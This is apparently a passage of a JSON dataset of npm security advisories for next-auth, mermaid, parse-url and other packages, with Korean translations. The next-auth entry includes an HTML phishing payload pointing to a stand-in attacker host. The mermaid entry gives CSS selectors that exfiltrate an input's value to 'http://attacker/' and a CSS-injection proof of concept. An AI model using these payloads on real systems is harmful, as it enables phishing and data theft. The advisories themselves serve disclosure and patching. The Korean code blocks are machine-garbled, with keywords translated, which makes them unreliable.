    "publishedAt": "2022-07-06T19:27:45Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-pgjx-7f9g-9463\nhttps://github.com/nextauthjs/next-auth/commit/ae834f1e08a4a9915665eecb9479c74c6b039c9c\nhttps://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.9.0\nhttps://next-auth.js.org/getting-started/upgrade-v4\nhttps://next-auth.js.org/providers/email#customizing-emails\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31127\nhttps://github.com/advisories/GHSA-pgjx-7f9g-9463",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.9.0",
    "identifier": "4.9.0",
    "descriptionKR": "### 영향\n\n공격자는 일부 악성 HTML이 포함된 이메일 [로그인 엔드포인트](https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider)에 손상된 입력을 전달하여 전자를 속일 수 있습니다. -피싱 공격을 수행할 수 있도록 사용자에게 메일 서버를 보냅니다. 예: `balazs@email.com, <a href=\"http://attacker.com\">로그인하기 전에 돈을 청구하세요!</a>`. 이것은 이전에 `balazs@email.com`으로 전송되었으며 공격자 사이트에 대한 링크가 포함된 이메일 내용이 HTML로 렌더링되었습니다. 이 문제는 다음 릴리스에서 해당 이메일을 HTML로 렌더링하지 않음으로써 해결되었습니다. 수신자가 어떤 이메일을 사용했는지 명확해야 하기 때문입니다.\n\n버전 3.29.8 이전의 next-auth v3 사용자는 영향을 받습니다. (v3는 유지 관리되지 않는 것으로 간주되므로 v4로 업그레이드하는 것이 좋습니다. [마이그레이션 가이드](https://next-auth.js.org/getting-started/upgrade-v4)를 참조하세요.)\n\n버전 4.8.0 이전의 next-auth v4 사용자는 영향을 받습니다.\n\n### 패치\n\n다음 위치에서 이 취약점에 대한 패치를 릴리스했습니다.\n  \n- v3 - `3.29.8`\n- v4 - `4.9.0`\n\n넌 할 수있어:\n\n```쉬\nnpm i next-auth@latest\n# 또는\n원사 추가 next-auth@latest\n#\npnpm add next-auth@latest\n```\n\n(이는 최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다. 권장하지 않습니다.)\n\n### 해결 방법\n\n어떤 이유로 업그레이드할 수 없는 경우 해결 방법을 사용하려면 `sendVerificationRequest`로 전달되고 HTML로 렌더링되는 `email` 매개변수를 삭제해야 합니다. 사용자 지정 `sendVerificationRequest`를 생성하지 않은 경우 업그레이드만 하면 됩니다. 그렇지 않으면 HTML 본문에서 `이메일`을 제외하거나 효율적으로 삭제해야 합니다. https://next-auth.js.org/providers/email#customizing-emails를 확인하세요.\n\n### 참조\n\n\n관련 문서:\n\n- https://next-auth.js.org/providers/email#customizing-emails\n- https://next-auth.js.org/getting-started/upgrade-v4\n\n테스트 사례가 추가되어 게시하기 전에 이러한 종류의 문제를 확인합니다. 참조: https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n이 문제는 2022년 6월 29일에 보고되었고, 1시간 이내에 보고자에게 응답이 전송되었으며, 문제를 식별한 후 영업일 기준 4일 이내에 패치가 게시되었습니다."
  },
  {
    "description": "### Impact\n\nAn attacker can pass a compromised input to the e-mail [signin endpoint](https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider) that contains some malicious HTML, tricking the e-mail server to send it to the user, so they can perform a phishing attack. Eg.: `balazs@email.com, <a href=\"http://attacker.com\">Before signing in, claim your money!</a>`. This was previously sent to `balazs@email.com`, and the content of the email containing a link to the attacker's site was rendered in the HTML. This has been remedied in the following releases, by simply not rendering that e-mail in the HTML, since it should be obvious to the receiver what e-mail they used:\n\nnext-auth v3 users before version 3.29.8 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\nnext-auth v4 users before version 4.8.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.8`\n- v4 - `4.9.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n# or\nyarn add next-auth@latest\n#\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to sanitize the `email` parameter that is passed to `sendVerificationRequest` and rendered in the HTML. If you haven't created a custom `sendVerificationRequest`, you only need to upgrade. Otherwise, make sure to either exclude `email` from the HTML body or efficiently sanitize it. Check out https://next-auth.js.org/providers/email#customizing-emails\n\n### References\n\n\nRelated documentation:\n\n- https://next-auth.js.org/providers/email#customizing-emails\n- https://next-auth.js.org/getting-started/upgrade-v4\n\nA test case has been added so this kind of issue will be checked before publishing. See: https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 June 29th, a response was sent out to the reporter in less than 1 hour, and after identifying the issue a patch was published within 4 working days.",
    "identifiers": "GHSA : GHSA-pgjx-7f9g-9463\nCVE : CVE-2022-31127",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:13Z",
    "publishedAt": "2022-07-06T19:27:45Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-pgjx-7f9g-9463\nhttps://github.com/nextauthjs/next-auth/commit/ae834f1e08a4a9915665eecb9479c74c6b039c9c\nhttps://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.9.0\nhttps://next-auth.js.org/getting-started/upgrade-v4\nhttps://next-auth.js.org/providers/email#customizing-emails\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31127\nhttps://github.com/advisories/GHSA-pgjx-7f9g-9463",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.29.8",
    "identifier": "3.29.8",
    "descriptionKR": "### 영향\n\n공격자는 일부 악성 HTML이 포함된 이메일 [로그인 엔드포인트](https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider)에 손상된 입력을 전달하여 전자를 속일 수 있습니다. -피싱 공격을 수행할 수 있도록 사용자에게 메일 서버를 보냅니다. 예: `balazs@email.com, <a href=\"http://attacker.com\">로그인하기 전에 돈을 청구하세요!</a>`. 이것은 이전에 `balazs@email.com`으로 전송되었으며 공격자 사이트에 대한 링크가 포함된 이메일 내용이 HTML로 렌더링되었습니다. 이 문제는 다음 릴리스에서 해당 이메일을 HTML로 렌더링하지 않음으로써 해결되었습니다. 수신자가 어떤 이메일을 사용했는지 명확해야 하기 때문입니다.\n\n버전 3.29.8 이전의 next-auth v3 사용자는 영향을 받습니다. (v3는 유지 관리되지 않는 것으로 간주되므로 v4로 업그레이드하는 것이 좋습니다. [마이그레이션 가이드](https://next-auth.js.org/getting-started/upgrade-v4)를 참조하세요.)\n\n버전 4.8.0 이전의 next-auth v4 사용자는 영향을 받습니다.\n\n### 패치\n\n다음 위치에서 이 취약점에 대한 패치를 릴리스했습니다.\n  \n- v3 - `3.29.8`\n- v4 - `4.9.0`\n\n넌 할 수있어:\n\n```쉬\nnpm i next-auth@latest\n# 또는\n원사 추가 next-auth@latest\n#\npnpm add next-auth@latest\n```\n\n(이는 최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다. 권장하지 않습니다.)\n\n### 해결 방법\n\n어떤 이유로 업그레이드할 수 없는 경우 해결 방법을 사용하려면 `sendVerificationRequest`로 전달되고 HTML로 렌더링되는 `email` 매개변수를 삭제해야 합니다. 사용자 지정 `sendVerificationRequest`를 생성하지 않은 경우 업그레이드만 하면 됩니다. 그렇지 않으면 HTML 본문에서 `이메일`을 제외하거나 효율적으로 삭제해야 합니다. https://next-auth.js.org/providers/email#customizing-emails를 확인하세요.\n\n### 참조\n\n\n관련 문서:\n\n- https://next-auth.js.org/providers/email#customizing-emails\n- https://next-auth.js.org/getting-started/upgrade-v4\n\n테스트 사례가 추가되어 게시하기 전에 이러한 종류의 문제를 확인합니다. 참조: https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n이 문제는 2022년 6월 29일에 보고되었고, 1시간 이내에 보고자에게 응답이 전송되었으며, 문제를 식별한 후 영업일 기준 4일 이내에 패치가 게시되었습니다."
  },
  {
    "description": "Summary\n\nIncomplete fix of CVE-2021-43306: An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the jquery-validation npm package, when an attacker is able to supply arbitrary input to the url2 method.",
    "identifiers": "GHSA : GHSA-ffmh-x56j-9rc3\nCVE : CVE-2022-31147",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:51Z",
    "publishedAt": "2022-07-05T22:56:58Z",
    "references": "https://github.com/jquery-validation/jquery-validation/security/advisories/GHSA-ffmh-x56j-9rc3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31147\nhttps://github.com/jquery-validation/jquery-validation/commit/5bbd80d27fc6b607d2f7f106c89522051a9fb0dd\nhttps://github.com/jquery-validation/jquery-validation/releases/tag/1.19.5\nhttps://github.com/advisories/GHSA-ffmh-x56j-9rc3",
    "name": "jquery-validation",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.19.5",
    "identifier": "1.19.5",
    "descriptionKR": "요약\n\nCVE-2021-43306의 불완전한 수정: 공격자가 url2 메서드에 임의의 입력을 제공할 수 있는 경우 jquery-validation npm 패키지에서 지수 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "Authorization Bypass Through User-Controlled Key in GitHub repository ionicabizau/parse-path prior to 5.0.0.",
    "identifiers": "GHSA : GHSA-3j8f-xvm3-ffx4\nCVE : CVE-2022-0624",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:24Z",
    "publishedAt": "2022-06-29T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0624\nhttps://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8\nhttps://huntr.dev/bounties/afffb2bd-fb06-4144-829e-ecbbcbc85388\nhttps://github.com/advisories/GHSA-3j8f-xvm3-ffx4",
    "name": "parse-path",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.0",
    "identifier": "5.0.0",
    "descriptionKR": "5.0.0 이전의 GitHub 저장소 ionicabizau/parse-path에서 사용자 제어 키를 통한 권한 부여 바이패스."
  },
  {
    "description": "Cross-site Scripting (XSS) - Generic in GitHub repository ionicabizau/parse-url prior to 6.0.1",
    "identifiers": "GHSA : GHSA-q6wq-5p59-983w\nCVE : CVE-2022-2217",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:53Z",
    "publishedAt": "2022-06-28T00:01:02Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2217\nhttps://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\nhttps://huntr.dev/bounties/4e046c63-b1ca-4bcc-b418-29796918a71b\nhttps://github.com/advisories/GHSA-q6wq-5p59-983w",
    "name": "parse-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "교차 사이트 스크립팅(XSS) - 6.0.1 이전의 GitHub 저장소 ionicabizau/parse-url의 일반"
  },
  {
    "description": "Server-Side Request Forgery (SSRF) in GitHub repository ionicabizau/parse-url prior to 7.0.0.",
    "identifiers": "GHSA : GHSA-7f3x-x4pr-wqhj\nCVE : CVE-2022-2216",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:04:36Z",
    "publishedAt": "2022-06-28T00:01:02Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2216\nhttps://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\nhttps://huntr.dev/bounties/505a3d39-2723-4a06-b1f7-9b2d133c92e1\nhttps://github.com/advisories/GHSA-7f3x-x4pr-wqhj",
    "name": "parse-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "7.0.0 이전의 GitHub 리포지토리 ionicabizau/parse-url에 있는 SSRF(Server-Side Request Forgery)."
  },
  {
    "description": "Cross-site Scripting (XSS) - Stored in GitHub repository ionicabizau/parse-url prior to 7.0.0.",
    "identifiers": "GHSA : GHSA-jpp7-7chh-cf67\nCVE : CVE-2022-2218",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:23Z",
    "publishedAt": "2022-06-28T00:01:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2218\nhttps://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\nhttps://huntr.dev/bounties/024912d3-f103-4daf-a1d0-567f4d9f2bf5\nhttps://github.com/advisories/GHSA-jpp7-7chh-cf67",
    "name": "parse-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "교차 사이트 스크립팅(XSS) - 7.0.0 이전의 GitHub 저장소 ionicabizau/parse-url에 저장되었습니다."
  },
  {
    "description": "Exposure of Sensitive Information to an Unauthorized Actor via hostname confusion in GitHub repository ionicabizau/parse-url prior to 6.0.1",
    "identifiers": "GHSA : GHSA-4p35-cfcx-8653\nCVE : CVE-2022-0722",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:36Z",
    "publishedAt": "2022-06-28T00:01:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0722\nhttps://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\nhttps://huntr.dev/bounties/2490ef6d-5577-4714-a4dd-9608251b4226\nhttps://github.com/advisories/GHSA-4p35-cfcx-8653",
    "name": "parse-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "6.0.1 이전의 GitHub 저장소 ionicabizau/parse-url에서 호스트 이름 혼동을 통해 승인되지 않은 행위자에게 민감한 정보 노출"
  },
  {
    "description": "Improperly handled errors in @discordjs/opus cause hard crashes instead of returning the error to user land.\", \"details\": \"All versions of package @discordjs/opus (<= 0.7.0) are vulnerable to Denial of Service (DoS) when trying to encode using an encoder with zero channels, or a non-initialized buffer. This leads to a hard crash due to improperly returning the errors from the invalid inputs.\n\nAs of version 0.8.0, the errors are correctly returned to the user and are no longer throwing hard crashes that cannot be recovered.",
    "identifiers": "GHSA : GHSA-rvgf-69j7-xh78\nCVE : CVE-2022-25345",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:31Z",
    "publishedAt": "2022-06-18T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25345\nhttps://snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-2403100\nhttps://github.com/discordjs/opus/blob/3ca4341ffdd81cf83cec57045e59e228e6017590/src/node-opus.cc#L28\nhttps://github.com/discordjs/opus/commit/406249f3fca484a2af97a34ceb989019efa09bc7\nhttps://github.com/discordjs/opus/releases/tag/v0.8.0\nhttps://github.com/advisories/GHSA-rvgf-69j7-xh78",
    "name": "@discordjs/opus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.8.0",
    "identifier": "0.8.0",
    "descriptionKR": "@discordjs/opus에서 부적절하게 처리된 오류는 오류를 사용자에게 반환하는 대신 심각한 충돌을 일으킵니다.\", \"details\": \"@discordjs/opus 패키지의 모든 버전(<= 0.7.0)은 서비스 거부(DoS)에 취약합니다. ) 채널이 0개인 인코더 또는 초기화되지 않은 버퍼를 사용하여 인코딩을 시도할 때. 이로 인해 잘못된 입력에서 오류를 부적절하게 반환하여 하드 충돌이 발생합니다.\n\n버전 0.8.0부터 오류가 사용자에게 올바르게 반환되고 복구할 수 없는 하드 충돌이 더 이상 발생하지 않습니다."
  },
  {
    "description": "An attacker is able to inject arbitrary `CSS` into the generated graph allowing them to change the styling of elements outside of the generated graph, and potentially exfiltrate sensitive information by using specially crafted `CSS` selectors.\n\nThe following example shows how an attacker can exfiltrate the contents of an input field by bruteforcing the `value` attribute one character at a time. Whenever there is an actual match, an `http` request will be made by the browser in order to \"load\" a background image that will let an attacker know what's the value of the character.\n\n```css\ninput[name=secret][value^=g] { background-image: url(http://attacker/?char=g); }\n...\ninput[name=secret][value^=go] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goo] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goos] { background-image: url(http://attacker/?char=s); }\n...\ninput[name=secret][value^=goose] { background-image: url(http://attacker/?char=e); }\n```\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)\n## Product\n\nmermaid.js\n\n## Tested Version\n\n[v9.1.1](https://github.com/mermaid-js/mermaid/releases/tag/9.1.1)\n\n## Details\n\n### Issue 1: Multiple CSS Injection (`GHSL-2022-036`)\n\nBy supplying a carefully crafted `textColor` theme variable, an attacker can inject arbitrary `CSS` rules into the document. In the following snippet we can see that `getStyles` does not sanitize any of the theme variables leaving the door open for `CSS` injection.\n\n_Snippet from [src/styles.js](https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35):_\n\n```js\nconst getStyles = (type, userStyles, options) => {\n  return ` {\n    font-family: ${options.fontFamily};\n    font-size: ${options.fontSize};\n    fill: ${options.textColor}\n  }\n```\n\nFor example, if we set `textColor` to `\"green;} #target { background-color: crimson }\"` the resulting `CSS` will contain a new selector `#target` that will apply a `crimson` background color to an arbitrary element.\n\n```html\n<html>\n\n<body>\n    <div id=\"target\">\n        <h1>This element does not belong to the SVG but we can style it</h1>\n    </div>\n    <svg id=\"diagram\">\n    </svg>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"></script>\n    <script>\n        mermaid.initialize({ startOnLoad: false });\n\n        const graph =\n            `\n            %%{ init: { \"themeVariables\" : { \"textColor\": \"green;} #target { background-color: crimson }\" } } }%%\n            graph TD\n                A[Goose]\n            `\n\n        const diagram = document.getElementById(\"diagram\")\n        const svg = mermaid.render('diagram-svg', graph)\n        diagram.innerHTML = svg\n    </script>\n</body>\n\n</html>\n```\n\nIn the proof of concept above we used the `textColor` variable to inject `CSS`, but there are multiple functions that can potentially be abused to change the style of the document. Some of them are in the following list but we encourage mantainers to look for additional injection points:\n\n- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393\n- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35\n\n#### Impact\n\nThis issue may lead to `Information Disclosure` via CSS selectors and functions able to generate HTTP requests. This also allows an attacker to change the document in ways which may lead a user to perform unintended actions, such as clicking on a link, etc.\n\n#### Remediation\n\nEnsure that user input is adequately escaped before embedding it in CSS blocks.",
    "identifiers": "GHSA : GHSA-x3vm-38hw-55wf\nCVE : CVE-2022-31108",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T19:28:57Z",
    "publishedAt": "2022-07-05T18:29:31Z",
    "references": "https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31108\nhttps://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225\nhttps://github.com/advisories/GHSA-x3vm-38hw-55wf",
    "name": "mermaid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 9.1.2",
    "identifier": "9.1.2",
    "descriptionKR": "공격자는 생성된 그래프에 임의의 'CSS'를 삽입하여 생성된 그래프 외부의 요소 스타일을 변경할 수 있으며 특수 제작된 'CSS' 선택자를 사용하여 민감한 정보를 유출할 수 있습니다.\n\n다음 예제는 공격자가 한 번에 한 문자씩 `value` 속성을 무차별 대입하여 입력 필드의 내용을 유출할 수 있는 방법을 보여줍니다. 실제로 일치하는 항목이 있을 때마다 공격자가 문자의 값을 알 수 있도록 배경 이미지를 \"로드\"하기 위해 브라우저에서 `http` 요청을 수행합니다.\n\n```css\n입력[이름=비밀][값^=g] { 배경 이미지: url(http://attacker/?char=g); }\n...\ninput[name=secret][value^=go] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goo] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goos] { background-image: url(http://attacker/?char=s); }\n...\ninput[name=secret][value^=goose] { background-image: url(http://attacker/?char=e); }\n```\n\n### 패치\n_문제가 패치되었나요? 사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\n### 해결 방법\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [repo에 대한 예제 링크](http://example.com)에서 이슈 열기\n* [예시 이메일 주소](mailto:example@example.com)로 이메일을 보내주세요.\n## 제품\n\nmermaid.js\n\n## 테스트 버전\n\n[v9.1.1](https://github.com/mermaid-js/mermaid/releases/tag/9.1.1)\n\n## 세부 정보\n\n### 문제 1: 다중 CSS 삽입(`GHSL-2022-036`)\n\n세심하게 제작된 'textColor' 테마 변수를 제공함으로써 공격자는 임의의 'CSS' 규칙을 문서에 주입할 수 있습니다. 다음 스니펫에서 우리는 `getStyles`가 `CSS` 주입을 위해 문을 열어둔 채 테마 변수를 삭제하지 않는다는 것을 볼 수 있습니다.\n\n_[src/styles.js](https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35)의 스니펫:_\n\n```js\nconst getStyles = (유형, 사용자 스타일, 옵션) => {\n  리턴 ` {\n    글꼴 패밀리: ${options.fontFamily};\n    글꼴 크기: ${options.fontSize};\n    채우기: ${options.textColor}\n  }\n```\n\n예를 들어 `textColor`를 `\"green;} #target { background-color: crimson }\"`로 설정하면 결과 `CSS`에는 `crimson` 배경색을 적용할 새 선택기 `#target`이 포함됩니다. 임의의 요소.\n\n```html\n<html>\n\n<몸>\n    <사업부 ID=\"대상\">\n        <h1>이 요소는 SVG에 속하지 않지만 스타일을 지정할 수 있습니다</h1>\n    </div>\n    <svg id=\"다이어그램\">\n    </svg>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"></script>\n    <스크립트>\n        mermaid.initialize({ startOnLoad: false });\n\n        상수 그래프 =\n            `\n            %%{ init: { \"themeVariables\" : { \"textColor\": \"green;} #target { background-color: crimson }\" } } }%%\n            그래프 TD\n                거위]\n            `\n\n        const 다이어그램 = document.getElementById(\"다이어그램\")\n        const svg = mermaid.render('다이어그램-svg', 그래프)\n        diagram.innerHTML = svg\n    </스크립트>\n</body>\n\n</html>\n```\n\n위의 개념 증명에서는 `textColor` 변수를 사용하여 `CSS`를 삽입했지만 문서의 스타일을 변경하는 데 잠재적으로 악용될 수 있는 여러 함수가 있습니다. 그 중 일부는 다음 목록에 있지만 관리자가 추가 주입 지점을 찾는 것이 좋습니다.\n\n- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393\n- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35\n\n#### 영향\n\n이 문제는 HTTP 요청을 생성할 수 있는 CSS 선택기 및 기능을 통해 '정보 공개'로 이어질 수 있습니다. 이것은 또한 공격자가 사용자가 링크 클릭 등과 같은 의도하지 않은 작업을 수행하도록 유도하는 방식으로 문서를 변경할 수 있도록 합니다.\n\n#### 교정\n\nCSS 블록에 삽입하기 전에 사용자 입력이 적절하게 이스케이프되었는지 확인하십시오."
  },
  {
    "description": "All versions of package deep-get-set are vulnerable to Prototype Pollution via the 'deep' function. **Note:** This vulnerability derives from an incomplete fix of [CVE-2020-7715](https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666)",
    "identifiers": "GHSA : GHSA-mjjj-6p43-vhhv\nCVE : CVE-2022-21231",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:00Z",
    "publishedAt": "2022-06-25T00:00:51Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21231\nhttps://snyk.io/vuln/SNYK-JS-DEEPGETSET-2342655\nhttps://github.com/advisories/GHSA-mjjj-6p43-vhhv",
    "name": "deep-get-set",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.1",
    "descriptionKR": "패키지 deep-get-set의 모든 버전은 'deep' 기능을 통한 Prototype Pollution에 취약합니다. **참고:** 이 취약점은 [CVE-2020-7715](https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666)의 불완전한 수정에서 파생됩니다."
  },
  {
    "description": "Prototype pollution vulnerability in ‘just-safe-set’ versions 1.0.0 through 2.2.1 allows an attacker to cause a denial of service and may lead to remote code execution.",
    "identifiers": "GHSA : GHSA-v26w-gcxh-v4r7\nCVE : CVE-2021-25952",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:00:55Z",
    "publishedAt": "2021-12-10T18:50:40Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-25952\nhttps://github.com/angus-c/just/pull/267\nhttps://github.com/angus-c/just/commit/dd57a476f4bb9d78c6f60741898dc04c71d2eb53\nhttps://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25952\nhttps://github.com/advisories/GHSA-v26w-gcxh-v4r7",
    "name": "just-safe-set",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 2.2.2",
    "identifier": "2.2.2",
    "descriptionKR": "'just-safe-set' 버전 1.0.0~2.2.1의 프로토타입 오염 취약성으로 인해 공격자가 서비스 거부를 유발하고 원격 코드 실행으로 이어질 수 있습니다."
  },
  {
    "description": "An issue was discovered in an npm 5.7.0 2018-02-21 pre-release (marked as \"next: 5.7.0\" and therefore automatically installed by an \"npm upgrade -g npm\" command, and also announced in the vendor's blog without mention of pre-release status). It might allow local users to bypass intended filesystem access restrictions because ownerships of /etc and /usr directories are being changed unexpectedly, related to a \"correctMkdir\" issue.",
    "identifiers": "GHSA : GHSA-ph34-pc88-72gc\nCVE : CVE-2018-7408",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:17Z",
    "publishedAt": "2022-05-13T01:53:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-7408\nhttps://github.com/npm/npm/issues/19883\nhttps://github.com/npm/npm/commit/74e149da6efe6ed89477faa81fef08eee7999ad0\nhttp://blog.npmjs.org/post/171169301000/v571\nhttps://github.com/advisories/GHSA-ph34-pc88-72gc",
    "name": "npm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.7.1",
    "identifier": "5.7.1",
    "descriptionKR": "npm 5.7.0 2018-02-21 시험판(\"next: 5.7.0\"으로 표시되어 \"npm upgrade -g npm\" 명령으로 자동 설치됨)에서 문제가 발견되었으며 공급업체 블로그에서도 발표되었습니다. 시험판 상태는 언급하지 않음). \"correctMkdir\" 문제와 관련하여 /etc 및 /usr 디렉토리의 소유권이 예기치 않게 변경되기 때문에 로컬 사용자가 의도한 파일 시스템 액세스 제한을 우회할 수 있습니다."
  },
  {
    "description": "The utilities function in all versions < 1.0.1 of the deap node module can be tricked into modifying the prototype of Object when the attacker can control part of the structure passed to this function. This can let an attacker add or modify existing properties that will exist on all objects.",
    "identifiers": "GHSA : GHSA-xg47-r67p-vhv5\nCVE : CVE-2018-3749",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:38Z",
    "publishedAt": "2022-05-14T03:05:46Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-3749\nhttps://hackerone.com/reports/310446\nhttps://github.com/selfcontained/deap/commit/ed27b7e890bdd616e1ee931ea1c64228e2b52a71\nhttps://github.com/advisories/GHSA-xg47-r67p-vhv5",
    "name": "deap",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.1",
    "identifier": "1.0.1",
    "descriptionKR": "공격자가 이 기능에 전달된 구조의 일부를 제어할 수 있는 경우 딥 노드 모듈의 모든 버전 < 1.0.1에 있는 유틸리티 기능을 속여 Object의 프로토타입을 수정할 수 있습니다. 이를 통해 공격자는 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있습니다."
  },
  {
    "description": "Blamer versions prior to 1.0.1 allows execution of arbitrary commands. It is possible to inject arbitrary commands as part of the arguments provided to blamer.",
    "identifiers": "GHSA : GHSA-8cxp-cjm8-fj36\nCVE : CVE-2019-10807",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:39Z",
    "publishedAt": "2022-05-24T17:10:48Z",
